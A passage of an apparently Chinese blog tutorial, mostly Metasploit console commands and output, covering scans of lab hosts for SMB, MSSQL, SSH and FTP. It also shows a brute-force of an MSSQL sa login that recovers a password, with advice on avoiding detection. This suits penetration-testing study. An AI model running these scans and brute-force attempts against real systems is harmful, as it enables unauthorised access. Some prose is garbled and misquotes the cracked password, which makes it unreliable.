<span class="mf">10.10</span><span class="p">.</span><span class="mf">10.2</span>               <span class="mi">0</span>
<span class="mf">10.10</span><span class="p">.</span><span class="mf">10.129</span>             <span class="mi">1</span>

<span class="nx">msf</span> <span class="nx">auxiliary</span><span class="p">(</span><span class="nx">smb_version</span><span class="p">)</span> <span class="o">&gt;</span> <span class="nx">hosts</span> <span class="mf">10.10</span><span class="p">.</span><span class="mf">10.129</span>

<span class="nx">Hosts</span>
<span class="o">=====</span>

<span class="nx">address</span>       <span class="nx">mac</span>                <span class="nx">name</span>          <span class="nx">os_name</span>  <span class="nx">os_flavor</span>  <span class="nx">os_sp</span>  <span class="nx">purpose</span>  <span class="nx">info</span>  <span class="nx">comments</span>
<span class="o">-------</span>       <span class="o">---</span>                <span class="o">----</span>          <span class="o">-------</span>  <span class="o">---------</span>  <span class="o">-----</span>  <span class="o">-------</span>  <span class="o">----</span>  <span class="o">--------</span>
<span class="mf">10.10</span><span class="p">.</span><span class="mf">10.129</span>  <span class="mi">00</span><span class="p">:</span><span class="mi">0</span><span class="nx">c</span><span class="p">:</span><span class="mi">29</span><span class="p">:</span><span class="nx">dd</span><span class="p">:</span><span class="nx">b7</span><span class="p">:</span><span class="mi">5</span><span class="nx">b</span>  <span class="mf">10.10</span><span class="p">.</span><span class="mf">10.129</span>  <span class="nx">Linux</span>               <span class="mf">2.6</span><span class="p">.</span><span class="nx">X</span>  <span class="nx">server</span>         

</code></pre></div></div>

<blockquote>
  <p>避免被对方察觉， 快速且安全的扫描到目标</p>
</blockquote>

<h3 id="扫描配置不当的mssql">扫描配置不当的MSSQL</h3>

<p>配置不当的MSSQL通常作为进入目标系统的第一个后门。MSSQL常作为其他常用软件(如VS)的先决条件被安装，很多管理员不知道他们的工作站安装MSSQL，且很少安装补丁或者配置。</p>

<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code>

<span class="nx">msf</span> <span class="o">&gt;</span> <span class="nx">use</span> <span class="nx">scanner</span><span class="o">/</span><span class="nx">mssql</span><span class="o">/</span><span class="nx">mssql_ping</span>
<span class="nx">msf</span> <span class="nx">auxiliary</span><span class="p">(</span><span class="nx">mssql_ping</span><span class="p">)</span> <span class="o">&gt;</span> <span class="nx">show</span> <span class="nx">options</span>

<span class="nx">Module</span> <span class="nx">options</span> <span class="p">(</span><span class="nx">auxiliary</span><span class="o">/</span><span class="nx">scanner</span><span class="o">/</span><span class="nx">mssql</span><span class="o">/</span><span class="nx">mssql_ping</span><span class="p">):</span>

   <span class="nx">Name</span>                 <span class="nx">Current</span> <span class="nx">Setting</span>  <span class="nx">Required</span>  <span class="nx">Description</span>
   <span class="o">----</span>                 <span class="o">---------------</span>  <span class="o">--------</span>  <span class="o">-----------</span>
   <span class="nx">PASSWORD</span>                              <span class="nx">no</span>        <span class="nx">The</span> <span class="nx">password</span> <span class="k">for</span> <span class="nx">the</span> <span class="nx">specified</span> <span class="nx">username</span>
   <span class="nx">RHOSTS</span>                                <span class="nx">yes</span>       <span class="nx">The</span> <span class="nx">target</span> <span class="nx">address</span> <span class="nx">range</span> <span class="nx">or</span> <span class="nx">CIDR</span> <span class="nx">identifier</span>
   <span class="nx">TDSENCRYPTION</span>        <span class="kc">false</span>            <span class="nx">yes</span>       <span class="nx">Use</span> <span class="nx">TLS</span><span class="o">/</span><span class="nx">SSL</span> <span class="k">for</span> <span class="nx">TDS</span> <span class="nx">data</span> <span class="s2">"Force Encryption"</span>
   <span class="nx">THREADS</span>              <span class="mi">1</span>                <span class="nx">yes</span>       <span class="nx">The</span> <span class="nx">number</span> <span class="k">of</span> <span class="nx">concurrent</span> <span class="nx">threads</span>
   <span class="nx">USERNAME</span>             <span class="nx">sa</span>               <span class="nx">no</span>        <span class="nx">The</span> <span class="nx">username</span> <span class="nx">to</span> <span class="nx">authenticate</span> <span class="k">as</span>
   <span class="nx">USE_WINDOWS_AUTHENT</span>  <span class="kc">false</span>            <span class="nx">yes</span>       <span class="nx">Use</span> <span class="nx">windows</span> <span class="nx">authentification</span> <span class="p">(</span><span class="nx">requires</span> <span class="nx">DOMAIN</span> <span class="nx">option</span> <span class="kd">set</span><span class="p">)</span>
<span class="nx">msf</span> <span class="nx">auxiliary</span><span class="p">(</span><span class="nx">mssql_ping</span><span class="p">)</span> <span class="o">&gt;</span> <span class="kd">set</span> <span class="nx">RHOSTS</span> <span class="mf">10.10</span><span class="p">.</span><span class="mf">10.150</span>
<span class="nx">RHOSTS</span> <span class="o">=&gt;</span> <span class="mf">10.10</span><span class="p">.</span><span class="mf">10.150</span>
<span class="nx">msf</span> <span class="nx">auxiliary</span><span class="p">(</span><span class="nx">mssql_ping</span><span class="p">)</span> <span class="o">&gt;</span> <span class="kd">set</span> <span class="nx">THREADS</span> <span class="mi">255</span>
<span class="nx">THREADS</span> <span class="o">=&gt;</span> <span class="mi">255</span>
<span class="nx">msf</span> <span class="nx">auxiliary</span><span class="p">(</span><span class="nx">mssql_ping</span><span class="p">)</span> <span class="o">&gt;</span> <span class="nx">run</span>

<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="nx">SQL</span> <span class="nx">Server</span> <span class="nx">information</span> <span class="k">for</span> <span class="mf">10.10</span><span class="p">.</span><span class="mf">10.150</span><span class="p">:</span>
<span class="p">[</span><span class="o">+</span><span class="p">]</span>    <span class="nx">ServerName</span>      <span class="o">=</span> <span class="nx">WIN</span><span class="o">-</span><span class="mi">9</span><span class="nx">V6F900LMVH</span>
<span class="p">[</span><span class="o">+</span><span class="p">]</span>    <span class="nx">InstanceName</span>    <span class="o">=</span> <span class="nx">SQLEXPRESS</span>
<span class="p">[</span><span class="o">+</span><span class="p">]</span>    <span class="nx">IsClustered</span>     <span class="o">=</span> <span class="nx">No</span>
<span class="p">[</span><span class="o">+</span><span class="p">]</span>    <span class="nx">Version</span>         <span class="o">=</span> <span class="mf">9.00</span><span class="p">.</span><span class="mf">4035.00</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="nx">Scanned</span> <span class="mi">1</span> <span class="k">of</span> <span class="mi">1</span> <span class="nx">hosts</span> <span class="p">(</span><span class="mi">100</span><span class="o">%</span> <span class="nx">complete</span><span class="p">)</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="nx">Auxiliary</span> <span class="nx">module</span> <span class="nx">execution</span> <span class="nx">completed</span>
</code></pre></div></div>

<blockquote>
  <p>在大量主机的子网中去查找MSSQL的监听端口，使用此方法的速度比起用nmap对所有主机的所有端口进行扫描要快得多</p>
</blockquote>

<h3 id="暴力破解mssql">暴力破解MSSQL</h3>

<p><strong>0x01 使用nmap扫描网络服务情况</strong></p>
<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code>

<span class="nx">db_nmap</span> <span class="o">-</span><span class="nx">sT</span> <span class="o">-</span><span class="nx">A</span> <span class="o">-</span><span class="nx">P0</span> <span class="mf">10.10</span><span class="p">.</span><span class="mf">10.130</span>
</code></pre></div></div>

<p><img src="/img/hack/Metasploit/1488679049102.png" alt="Alt text" /></p>

<p><strong>0x02确认MSSQL的存在</strong></p>
<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">msf</span> <span class="nx">exploit</span><span class="p">(</span><span class="nx">mssql_payload</span><span class="p">)</span> <span class="o">&gt;</span> <span class="nx">nmap</span> <span class="o">-</span><span class="nx">sU</span> <span class="mf">10.10</span><span class="p">.</span><span class="mf">10.130</span> <span class="o">-</span><span class="nx">p1434</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="nx">exec</span><span class="p">:</span> <span class="nx">nmap</span> <span class="o">-</span><span class="nx">sU</span> <span class="mf">10.10</span><span class="p">.</span><span class="mf">10.130</span> <span class="o">-</span><span class="nx">p1434</span>


<span class="nx">Starting</span> <span class="nx">Nmap</span> <span class="mf">7.01</span> <span class="p">(</span> <span class="nx">https</span><span class="p">:</span><span class="c1">//nmap.org ) at 2016-03-04 20:47 EST</span>
<span class="nx">Nmap</span> <span class="nx">scan</span> <span class="nx">report</span> <span class="k">for</span> <span class="nx">service</span><span class="p">.</span><span class="nx">dvssc</span><span class="p">.</span><span class="nx">com</span> <span class="p">(</span><span class="mf">10.10</span><span class="p">.</span><span class="mf">10.130</span><span class="p">)</span>
<span class="nx">Host</span> <span class="nx">is</span> <span class="nx">up</span> <span class="p">(</span><span class="mf">0.00035</span><span class="nx">s</span> <span class="nx">latency</span><span class="p">).</span>
<span class="nx">PORT</span>     <span class="nx">STATE</span>         <span class="nx">SERVICE</span>
<span class="mi">1434</span><span class="o">/</span><span class="nx">udp</span> <span class="nx">open</span><span class="o">|</span><span class="nx">filtered</span> <span class="nx">ms</span><span class="o">-</span><span class="nx">sql</span><span class="o">-</span><span class="nx">m</span>
<span class="nx">MAC</span> <span class="nx">Address</span><span class="p">:</span> <span class="mi">00</span><span class="p">:</span><span class="mi">0</span><span class="nx">C</span><span class="p">:</span><span class="mi">29</span><span class="p">:</span><span class="mi">9</span><span class="nx">D</span><span class="p">:</span><span class="mi">6</span><span class="nx">E</span><span class="p">:</span><span class="mi">8</span><span class="nx">D</span> <span class="p">(</span><span class="nx">VMware</span><span class="p">)</span>

<span class="nx">Nmap</span> <span class="nx">done</span><span class="p">:</span> <span class="mi">1</span> <span class="nx">IP</span> <span class="nx">address</span> <span class="p">(</span><span class="mi">1</span> <span class="nx">host</span> <span class="nx">up</span><span class="p">)</span> <span class="nx">scanned</span> <span class="k">in</span> <span class="mf">0.45</span> <span class="nx">seconds</span>
</code></pre></div></div>

<p><strong>0x03<code class="highlighter-rouge">mssql_ping模块找出mssql服务情况</code></strong></p>

<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">msf</span> <span class="nx">exploit</span><span class="p">(</span><span class="nx">mssql_payload</span><span class="p">)</span> <span class="o">&gt;</span> <span class="nx">use</span> <span class="nx">auxiliary</span><span class="o">/</span><span class="nx">scanner</span><span class="o">/</span><span class="nx">mssql</span><span class="o">/</span><span class="nx">mssql_ping</span> 
<span class="nx">msf</span> <span class="nx">auxiliary</span><span class="p">(</span><span class="nx">mssql_ping</span><span class="p">)</span> <span class="o">&gt;</span> <span class="kd">set</span> <span class="nx">RHOSTS</span> <span class="mf">10.10</span><span class="p">.</span><span class="mf">10.130</span>
<span class="nx">RHOSTS</span> <span class="o">=&gt;</span> <span class="mf">10.10</span><span class="p">.</span><span class="mf">10.130</span>
<span class="nx">msf</span> <span class="nx">auxiliary</span><span class="p">(</span><span class="nx">mssql_ping</span><span class="p">)</span> <span class="o">&gt;</span> <span class="nx">show</span> <span class="nx">options</span>

<span class="nx">Module</span> <span class="nx">options</span> <span class="p">(</span><span class="nx">auxiliary</span><span class="o">/</span><span class="nx">scanner</span><span class="o">/</span><span class="nx">mssql</span><span class="o">/</span><span class="nx">mssql_ping</span><span class="p">):</span>

   <span class="nx">Name</span>                 <span class="nx">Current</span> <span class="nx">Setting</span>  <span class="nx">Required</span>  <span class="nx">Description</span>
   <span class="o">----</span>                 <span class="o">---------------</span>  <span class="o">--------</span>  <span class="o">-----------</span>
   <span class="nx">PASSWORD</span>                              <span class="nx">no</span>        <span class="nx">The</span> <span class="nx">password</span> <span class="k">for</span> <span class="nx">the</span> <span class="nx">specified</span> <span class="nx">username</span>
   <span class="nx">RHOSTS</span>               <span class="mf">10.10</span><span class="p">.</span><span class="mf">10.130</span>     <span class="nx">yes</span>       <span class="nx">The</span> <span class="nx">target</span> <span class="nx">address</span> <span class="nx">range</span> <span class="nx">or</span> <span class="nx">CIDR</span> <span class="nx">identifier</span>
   <span class="nx">TDSENCRYPTION</span>        <span class="kc">false</span>            <span class="nx">yes</span>       <span class="nx">Use</span> <span class="nx">TLS</span><span class="o">/</span><span class="nx">SSL</span> <span class="k">for</span> <span class="nx">TDS</span> <span class="nx">data</span> <span class="s2">"Force Encryption"</span>
   <span class="nx">THREADS</span>              <span class="mi">20</span>               <span class="nx">yes</span>       <span class="nx">The</span> <span class="nx">number</span> <span class="k">of</span> <span class="nx">concurrent</span> <span class="nx">threads</span>
   <span class="nx">USERNAME</span>             <span class="nx">sa</span>               <span class="nx">no</span>        <span class="nx">The</span> <span class="nx">username</span> <span class="nx">to</span> <span class="nx">authenticate</span> <span class="k">as</span>
   <span class="nx">USE_WINDOWS_AUTHENT</span>  <span class="kc">false</span>            <span class="nx">yes</span>       <span class="nx">Use</span> <span class="nx">windows</span> <span class="nx">authentification</span> <span class="p">(</span><span class="nx">requires</span> <span class="nx">DOMAIN</span> <span class="nx">option</span> <span class="kd">set</span><span class="p">)</span>

<span class="nx">msf</span> <span class="nx">auxiliary</span><span class="p">(</span><span class="nx">mssql_ping</span><span class="p">)</span> <span class="o">&gt;</span> <span class="nx">exploit</span>

<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="nx">SQL</span> <span class="nx">Server</span> <span class="nx">information</span> <span class="k">for</span> <span class="mf">10.10</span><span class="p">.</span><span class="mf">10.130</span><span class="p">:</span>
<span class="p">[</span><span class="o">+</span><span class="p">]</span>    <span class="nx">ServerName</span>      <span class="o">=</span> <span class="nx">ROOT</span><span class="o">-</span><span class="nx">TVI862UBEH</span>
<span class="p">[</span><span class="o">+</span><span class="p">]</span>    <span class="nx">InstanceName</span>    <span class="o">=</span> <span class="nx">MSSQLSERVER</span>
<span class="p">[</span><span class="o">+</span><span class="p">]</span>    <span class="nx">IsClustered</span>     <span class="o">=</span> <span class="nx">No</span>
<span class="p">[</span><span class="o">+</span><span class="p">]</span>    <span class="nx">Version</span>         <span class="o">=</span> <span class="mf">9.00</span><span class="p">.</span><span class="mf">1399.06</span>
<span class="p">[</span><span class="o">+</span><span class="p">]</span>    <span class="nx">tcp</span>             <span class="o">=</span> <span class="mi">1433</span>
<span class="p">[</span><span class="o">+</span><span class="p">]</span>    <span class="nx">np</span>              <span class="o">=</span> <span class="err">\\</span><span class="nx">ROOT</span><span class="o">-</span><span class="nx">TVI862UBEH</span><span class="err">\</span><span class="nx">pipe</span><span class="err">\</span><span class="nx">sql</span><span class="err">\</span><span class="nx">query</span>
<span class="p">[</span><span class="o">+</span><span class="p">]</span>    <span class="nx">via</span>             <span class="o">=</span> <span class="nx">ROOT</span><span class="o">-</span><span class="nx">TVI862UBEH</span><span class="p">,</span><span class="mi">0</span><span class="p">:</span><span class="mi">1433</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="nx">Scanned</span> <span class="mi">1</span> <span class="k">of</span> <span class="mi">1</span> <span class="nx">hosts</span> <span class="p">(</span><span class="mi">100</span><span class="o">%</span> <span class="nx">complete</span><span class="p">)</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="nx">Auxiliary</span> <span class="nx">module</span> <span class="nx">execution</span> <span class="nx">completed</span>
<span class="nx">msf</span> <span class="nx">auxiliary</span><span class="p">(</span><span class="nx">mssql_ping</span><span class="p">)</span> <span class="o">&gt;</span> 
<span class="s2">```javascript


**用户名和口令猜测**
MSSQL在初次安装时，需要用户创建sa或者系统管理员用户，管理员在安装时，又常常会设置空密码或者弱密码，所以可以尝试暴力破解密码
```</span><span class="nx">javascript</span>


<span class="nx">msf</span> <span class="nx">auxiliary</span><span class="p">(</span><span class="nx">mssql_ping</span><span class="p">)</span> <span class="o">&gt;</span> <span class="nx">use</span> <span class="nx">auxiliary</span><span class="o">/</span><span class="nx">scanner</span><span class="o">/</span><span class="nx">mssql</span><span class="o">/</span><span class="nx">mssql_login</span>
<span class="nx">msf</span> <span class="nx">auxiliary</span><span class="p">(</span><span class="nx">mssql_login</span><span class="p">)</span> <span class="o">&gt;</span> <span class="nx">show</span> <span class="nx">options</span>

<span class="nx">Module</span> <span class="nx">options</span> <span class="p">(</span><span class="nx">auxiliary</span><span class="o">/</span><span class="nx">scanner</span><span class="o">/</span><span class="nx">mssql</span><span class="o">/</span><span class="nx">mssql_login</span><span class="p">):</span>

   <span class="nx">Name</span>                 <span class="nx">Current</span> <span class="nx">Setting</span>                     <span class="nx">Required</span>  <span class="nx">Description</span>
   <span class="o">----</span>                 <span class="o">---------------</span>                     <span class="o">--------</span>  <span class="o">-----------</span>
   <span class="nx">BLANK_PASSWORDS</span>      <span class="kc">false</span>                               <span class="nx">no</span>        <span class="nx">Try</span> <span class="nx">blank</span> <span class="nx">passwords</span> <span class="k">for</span> <span class="nx">all</span> <span class="nx">users</span>
   <span class="nx">BRUTEFORCE_SPEED</span>     <span class="mi">5</span>                                   <span class="nx">yes</span>       <span class="nx">How</span> <span class="nx">fast</span> <span class="nx">to</span> <span class="nx">bruteforce</span><span class="p">,</span> <span class="k">from</span> <span class="mi">0</span> <span class="nx">to</span> <span class="mi">5</span>
   <span class="nx">DB_ALL_CREDS</span>         <span class="kc">false</span>                               <span class="nx">no</span>        <span class="nx">Try</span> <span class="nx">each</span> <span class="nx">user</span><span class="o">/</span><span class="nx">password</span> <span class="nx">couple</span> <span class="nx">stored</span> <span class="k">in</span> <span class="nx">the</span> <span class="nx">current</span> <span class="nx">database</span>
   <span class="nx">DB_ALL_PASS</span>          <span class="kc">false</span>                               <span class="nx">no</span>        <span class="nx">Add</span> <span class="nx">all</span> <span class="nx">passwords</span> <span class="k">in</span> <span class="nx">the</span> <span class="nx">current</span> <span class="nx">database</span> <span class="nx">to</span> <span class="nx">the</span> <span class="nx">list</span>
   <span class="nx">DB_ALL_USERS</span>         <span class="kc">false</span>                               <span class="nx">no</span>        <span class="nx">Add</span> <span class="nx">all</span> <span class="nx">users</span> <span class="k">in</span> <span class="nx">the</span> <span class="nx">current</span> <span class="nx">database</span> <span class="nx">to</span> <span class="nx">the</span> <span class="nx">list</span>
   <span class="nx">PASSWORD</span>                                                 <span class="nx">no</span>        <span class="nx">A</span> <span class="nx">specific</span> <span class="nx">password</span> <span class="nx">to</span> <span class="nx">authenticate</span> <span class="kd">with</span>
   <span class="nx">PASS_FILE</span>            <span class="o">/</span><span class="nx">usr</span><span class="o">/</span><span class="nx">share</span><span class="o">/</span><span class="nx">wordlists</span><span class="o">/</span><span class="nx">fasttrack</span><span class="p">.</span><span class="nx">txt</span>  <span class="nx">no</span>        <span class="nx">File</span> <span class="nx">containing</span> <span class="nx">passwords</span><span class="p">,</span> <span class="nx">one</span> <span class="nx">per</span> <span class="nx">line</span>
   <span class="nx">RHOSTS</span>               <span class="mf">10.10</span><span class="p">.</span><span class="mf">10.130</span>                        <span class="nx">yes</span>       <span class="nx">The</span> <span class="nx">target</span> <span class="nx">address</span> <span class="nx">range</span> <span class="nx">or</span> <span class="nx">CIDR</span> <span class="nx">identifier</span>
 <span class="p">...</span>

<span class="nx">msf</span> <span class="nx">auxiliary</span><span class="p">(</span><span class="nx">mssql_login</span><span class="p">)</span> <span class="o">&gt;</span> <span class="nx">exploit</span> 

<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="mf">10.10</span><span class="p">.</span><span class="mf">10.130</span><span class="p">:</span><span class="mi">1433</span> <span class="o">-</span> <span class="nx">MSSQL</span> <span class="o">-</span> <span class="nx">Starting</span> <span class="nx">authentication</span> <span class="nx">scanner</span><span class="p">.</span>
<span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="mf">10.10</span><span class="p">.</span><span class="mf">10.130</span><span class="p">:</span><span class="mi">1433</span> <span class="o">-</span> <span class="nx">LOGIN</span> <span class="nx">SUCCESSFUL</span><span class="p">:</span> <span class="nx">WORKSTATION</span><span class="err">\</span><span class="nx">sa</span><span class="p">:</span><span class="nx">admin3333</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="nx">Scanned</span> <span class="mi">1</span> <span class="k">of</span> <span class="mi">1</span> <span class="nx">hosts</span> <span class="p">(</span><span class="mi">100</span><span class="o">%</span> <span class="nx">complete</span><span class="p">)</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="nx">Auxiliary</span> <span class="nx">module</span> <span class="nx">execution</span> <span class="nx">completed</span>
<span class="nx">msf</span> <span class="nx">auxiliary</span><span class="p">(</span><span class="nx">mssql_login</span><span class="p">)</span> <span class="o">&gt;</span> 
</code></pre></div></div>

<p>爆破出密码是amdin3333</p>

<h3 id="ssh服务器扫描">ssh服务器扫描</h3>

<p>使用Metasploit伤的<code class="highlighter-rouge">ssh_version</code>魔魁啊来识别服务器上运行的SSH版本。</p>
<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code>

<span class="nx">msf</span> <span class="o">&gt;</span> <span class="nx">use</span> <span class="nx">scanner</span><span class="o">/</span><span class="nx">ssh</span><span class="o">/</span><span class="nx">ssh_version</span>
<span class="nx">msf</span> <span class="nx">auxiliary</span><span class="p">(</span><span class="nx">ssh_version</span><span class="p">)</span> <span class="o">&gt;</span> <span class="nx">show</span> <span class="nx">options</span>

<span class="nx">Module</span> <span class="nx">options</span> <span class="p">(</span><span class="nx">auxiliary</span><span class="o">/</span><span class="nx">scanner</span><span class="o">/</span><span class="nx">ssh</span><span class="o">/</span><span class="nx">ssh_version</span><span class="p">):</span>

   <span class="nx">Name</span>     <span class="nx">Current</span> <span class="nx">Setting</span>  <span class="nx">Required</span>  <span class="nx">Description</span>
   <span class="o">----</span>     <span class="o">---------------</span>  <span class="o">--------</span>  <span class="o">-----------</span>
   <span class="nx">RHOSTS</span>                    <span class="nx">yes</span>       <span class="nx">The</span> <span class="nx">target</span> <span class="nx">address</span> <span class="nx">range</span> <span class="nx">or</span> <span class="nx">CIDR</span> <span class="nx">identifier</span>
   <span class="nx">RPORT</span>    <span class="mi">22</span>               <span class="nx">yes</span>       <span class="nx">The</span> <span class="nx">target</span> <span class="nx">port</span>
   <span class="nx">THREADS</span>  <span class="mi">1</span>                <span class="nx">yes</span>       <span class="nx">The</span> <span class="nx">number</span> <span class="k">of</span> <span class="nx">concurrent</span> <span class="nx">threads</span>
   <span class="nx">TIMEOUT</span>  <span class="mi">30</span>               <span class="nx">yes</span>       <span class="nx">Timeout</span> <span class="k">for</span> <span class="nx">the</span> <span class="nx">SSH</span> <span class="nx">probe</span>

<span class="nx">msf</span> <span class="nx">auxiliary</span><span class="p">(</span><span class="nx">ssh_version</span><span class="p">)</span> <span class="o">&gt;</span> <span class="kd">set</span> <span class="nx">THREADS</span> <span class="mi">55</span>
<span class="nx">THREADS</span> <span class="o">=&gt;</span> <span class="mi">55</span>
<span class="nx">msf</span> <span class="nx">auxiliary</span><span class="p">(</span><span class="nx">ssh_version</span><span class="p">)</span> <span class="o">&gt;</span> <span class="kd">set</span> <span class="nx">RHOSTS</span> <span class="mf">10.10</span><span class="p">.</span><span class="mf">10.1</span><span class="o">/</span><span class="mi">24</span>
<span class="nx">RHOSTS</span> <span class="o">=&gt;</span> <span class="mf">10.10</span><span class="p">.</span><span class="mf">10.1</span><span class="o">/</span><span class="mi">24</span>
<span class="nx">msf</span> <span class="nx">auxiliary</span><span class="p">(</span><span class="nx">ssh_version</span><span class="p">)</span> <span class="o">&gt;</span> <span class="nx">run</span>

<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="mf">10.10</span><span class="p">.</span><span class="mf">10.1</span><span class="p">:</span><span class="mi">22</span> <span class="nx">SSH</span> <span class="nx">server</span> <span class="nx">version</span><span class="p">:</span> <span class="nx">SSH</span><span class="o">-</span><span class="mf">2.0</span><span class="o">-</span><span class="nx">MS_1</span><span class="p">.</span><span class="mi">100</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="nx">Scanned</span>  <span class="mi">32</span> <span class="k">of</span> <span class="mi">256</span> <span class="nx">hosts</span> <span class="p">(</span><span class="mi">12</span><span class="o">%</span> <span class="nx">complete</span><span class="p">)</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="nx">Scanned</span>  <span class="mi">56</span> <span class="k">of</span> <span class="mi">256</span> <span class="nx">hosts</span> <span class="p">(</span><span class="mi">21</span><span class="o">%</span> <span class="nx">complete</span><span class="p">)</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="nx">Scanned</span>  <span class="mi">78</span> <span class="k">of</span> <span class="mi">256</span> <span class="nx">hosts</span> <span class="p">(</span><span class="mi">30</span><span class="o">%</span> <span class="nx">complete</span><span class="p">)</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="mf">10.10</span><span class="p">.</span><span class="mf">10.129</span><span class="p">:</span><span class="mi">22</span> <span class="nx">SSH</span> <span class="nx">server</span> <span class="nx">version</span><span class="p">:</span> <span class="nx">SSH</span><span class="o">-</span><span class="mf">2.0</span><span class="o">-</span><span class="nx">OpenSSH_5</span><span class="p">.</span><span class="mi">3</span><span class="nx">p1</span> <span class="nx">Debian</span><span class="o">-</span><span class="mi">3</span><span class="nx">ubuntu4</span> <span class="p">(</span> <span class="nx">service</span><span class="p">.</span><span class="nx">version</span><span class="o">=</span><span class="mf">5.3</span><span class="nx">p1</span> <span class="nx">openssh</span><span class="p">.</span><span class="nx">comment</span><span class="o">=</span><span class="nx">Debian</span><span class="o">-</span><span class="mi">3</span><span class="nx">ubuntu4</span> <span class="nx">service</span><span class="p">.</span><span class="nx">vendor</span><span class="o">=</span><span class="nx">OpenBSD</span> <span class="nx">service</span><span class="p">.</span><span class="nx">family</span><span class="o">=</span><span class="nx">OpenSSH</span> <span class="nx">service</span><span class="p">.</span><span class="nx">product</span><span class="o">=</span><span class="nx">OpenSSH</span> <span class="nx">os</span><span class="p">.</span><span class="nx">vendor</span><span class="o">=</span><span class="nx">Ubuntu</span> <span class="nx">os</span><span class="p">.</span><span class="nx">device</span><span class="o">=</span><span class="nx">General</span> <span class="nx">os</span><span class="p">.</span><span class="nx">family</span><span class="o">=</span><span class="nx">Linux</span> <span class="nx">os</span><span class="p">.</span><span class="nx">product</span><span class="o">=</span><span class="nx">Linux</span> <span class="nx">os</span><span class="p">.</span><span class="nx">version</span><span class="o">=</span><span class="mf">10.04</span> <span class="p">)</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="nx">Scanned</span> <span class="mi">107</span> <span class="k">of</span> <span class="mi">256</span> <span class="nx">hosts</span> <span class="p">(</span><span class="mi">41</span><span class="o">%</span> <span class="nx">complete</span><span class="p">)</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="nx">Scanned</span> <span class="mi">131</span> <span class="k">of</span> <span class="mi">256</span> <span class="nx">hosts</span> <span class="p">(</span><span class="mi">51</span><span class="o">%</span> <span class="nx">complete</span><span class="p">)</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="nx">Scanned</span> <span class="mi">160</span> <span class="k">of</span> <span class="mi">256</span> <span class="nx">hosts</span> <span class="p">(</span><span class="mi">62</span><span class="o">%</span> <span class="nx">complete</span><span class="p">)</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="nx">Scanned</span> <span class="mi">186</span> <span class="k">of</span> <span class="mi">256</span> <span class="nx">hosts</span> <span class="p">(</span><span class="mi">72</span><span class="o">%</span> <span class="nx">complete</span><span class="p">)</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="nx">Scanned</span> <span class="mi">206</span> <span class="k">of</span> <span class="mi">256</span> <span class="nx">hosts</span> <span class="p">(</span><span class="mi">80</span><span class="o">%</span> <span class="nx">complete</span><span class="p">)</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="nx">Scanned</span> <span class="mi">231</span> <span class="k">of</span> <span class="mi">256</span> <span class="nx">hosts</span> <span class="p">(</span><span class="mi">90</span><span class="o">%</span> <span class="nx">complete</span><span class="p">)</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="nx">Scanned</span> <span class="mi">256</span> <span class="k">of</span> <span class="mi">256</span> <span class="nx">hosts</span> <span class="p">(</span><span class="mi">100</span><span class="o">%</span> <span class="nx">complete</span><span class="p">)</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="nx">Auxiliary</span> <span class="nx">module</span> <span class="nx">execution</span> <span class="nx">completed</span>
</code></pre></div></div>

<h3 id="ftp扫描">FTP扫描</h3>

<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">msf</span> <span class="o">&gt;</span> <span class="nx">use</span> <span class="nx">scanner</span><span class="o">/</span><span class="nx">ftp</span><span class="o">/</span><span class="nx">ftp_version</span>
<span class="nx">msf</span> <span class="nx">auxiliary</span><span class="p">(</span><span class="nx">ftp_version</span><span class="p">)</span> <span class="o">&gt;</span> <span class="nx">show</span> <span class="nx">options</span>

<span class="nx">Module</span> <span class="nx">options</span> <span class="p">(</span><span class="nx">auxiliary</span><span class="o">/</span><span class="nx">scanner</span><span class="o">/</span><span class="nx">ftp</span><span class="o">/</span><span class="nx">ftp_version</span><span class="p">):</span>

   <span class="nx">Name</span>     <span class="nx">Current</span> <span class="nx">Setting</span>      <span class="nx">Required</span>  <span class="nx">Description</span>
   <span class="o">----</span>     <span class="o">---------------</span>      <span class="o">--------</span>  <span class="o">-----------</span>
   <span class="nx">FTPPASS</span>  <span class="nx">mozilla</span><span class="p">@</span><span class="nd">example</span><span class="p">.</span><span class="nx">com</span>  <span class="nx">no</span>        <span class="nx">The</span> <span class="nx">password</span> <span class="k">for</span> <span class="nx">the</span> <span class="nx">specified</span> <span class="nx">username</span>
   <span class="nx">FTPUSER</span>  <span class="nx">anonymous</span>            <span class="nx">no</span>        <span class="nx">The</span> <span class="nx">username</span> <span class="nx">to</span> <span class="nx">authenticate</span> <span class="k">as</span>
   <span class="nx">RHOSTS</span>                        <span class="nx">yes</span>       <span class="nx">The</span> <span class="nx">target</span> <span class="nx">address</span> <span class="nx">range</span> <span class="nx">or</span> <span class="nx">CIDR</span> <span class="nx">identifier</span>
